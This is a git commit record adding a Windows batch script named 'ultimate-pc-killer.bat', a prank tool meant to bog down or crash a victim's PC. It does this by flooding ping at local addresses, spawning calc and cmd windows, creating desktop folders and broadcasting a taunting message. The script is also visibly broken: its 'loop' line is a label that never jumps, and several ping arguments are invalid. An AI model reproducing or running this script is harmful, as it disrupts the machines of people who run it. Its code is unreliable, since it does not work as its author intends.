3c93fd823b3aaf5dd6724d86428adb7b8891c97b
__p r i v a t e !! <73804955+drollgames@users.noreply.github.com>
2021-11-08 00:46:48 -0300

    Add files via upload

---
+++ app/windows-killer/v2/ultimate-pc-killer.bat
@@ -0,0 +1,17 @@
+@echo off
+:loop
+cd C:\users\%username%\desktop
+mkdir BYE
+echo matando pc...
+mkdir LAG
+ping 127.0.0.1 -l 658746 -n 10000000 -f 0.000002
+ping 0.0.0.0 -l 65746 -n 10000000 -f 0.000002
+start calc
+start cmd
+color 1
+color 2
+color 3
+color 4
+mkdir ULTIMATE PC KILLER
+msg * BYE RAM >:D
+:goto loop
